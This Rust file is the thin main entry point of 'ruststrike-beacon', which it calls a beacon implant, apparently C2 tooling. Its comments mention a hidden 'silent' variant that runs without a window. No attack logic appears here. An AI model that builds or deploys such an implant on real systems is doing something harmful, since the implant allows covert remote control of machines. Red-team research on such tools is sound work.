//! ruststrike-beacon: console-subsystem beacon implant.
//!
//! Shows a console window on launch (dev only — use `--features verbose` to see
//! the `[beacon] ...` logs). For a hidden/background agent use the
//! `ruststrike-beacon-silent` bin (GUI subsystem, no window) instead.
//!
//! All logic lives in the `ruststrike_beacon` lib; this is a thin entry point.

fn main() -> anyhow::Result<()> {
    ruststrike_beacon::run()
}
